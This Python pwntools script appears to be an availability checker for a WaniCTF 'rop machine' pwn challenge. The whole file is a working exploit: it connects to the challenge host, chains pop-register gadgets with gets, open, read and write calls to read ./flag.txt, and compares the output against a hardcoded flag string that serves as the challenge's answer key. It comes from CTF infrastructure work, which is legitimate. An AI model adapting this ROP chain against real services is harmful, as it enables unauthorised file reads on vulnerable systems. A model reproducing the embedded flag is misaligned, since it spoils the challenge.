import socket
import pwn
import time


def read_until(s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret


def get_flag_msg(ret):
    flag_start = ret.find(b"FLAG{")
    print(flag_start)
    flag_end = ret.find(b"}", flag_start)
    print(flag_end)
    return ret[flag_start : flag_end + 1]


def cmd_append_hex(val):
    io.send(b"1\n")
    ret = read_until(b": ")
    s = b"%x\n" % (val)
    io.send(s)
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdi():
    io.send(b"2\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rsi():
    io.send(b"3\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdx():
    io.send(b"4\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_gets():
    io.send(b"5\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_open():
    io.send(b"6\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_read():
    io.send(b"7\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_write():
    io.send(b"8\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_show_arena():
    io.send(b"b\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_execute():
    io.send(b"0\n")


#    io.interactive()


def check_pwn_rop_machine_final(hostname):
    global io
    try:

        io = pwn.remote(hostname, 9005, timeout=3)
    except:
        return 2

    try:
        ret = read_until(b">")
        print(ret.decode())

        cmd_append_pop_rdi()
        cmd_append_hex(0x404140)
        cmd_append_gets()

        cmd_append_pop_rdi()
        cmd_append_hex(0x404140)
        cmd_append_pop_rsi()
        cmd_append_hex(0x0)
        cmd_append_pop_rdx()
        cmd_append_hex(0)
        cmd_append_open()

        cmd_append_pop_rdi()
        cmd_append_hex(3)
        cmd_append_pop_rsi()
        cmd_append_hex(0x404140)
        cmd_append_pop_rdx()
        cmd_append_hex(100)
        cmd_append_read()

        cmd_append_pop_rdi()
        cmd_append_hex(1)
        cmd_append_pop_rsi()
        cmd_append_hex(0x404140)
        cmd_append_pop_rdx()
        cmd_append_hex(100)
        cmd_append_write()

        cmd_show_arena()
        time.sleep(3)

        cmd_execute()

        time.sleep(3)

        io.send(b"./flag.txt\n")
        time.sleep(3)
        ret = read_until(b"}")
        print(ret)
        flag = get_flag_msg(ret)
        print(flag)

        if flag == b"FLAG{you-might-be-the-real-rop-master}":
            return 0
        return 1

    except Exception as e:
        print(e)
        return 1

    finally:
        io.close()


if __name__ == "__main__":
    ret = check_pwn_rop_machine_final("sarutest.pwn.wanictf.org")
    if ret == 0:
        print("alive")
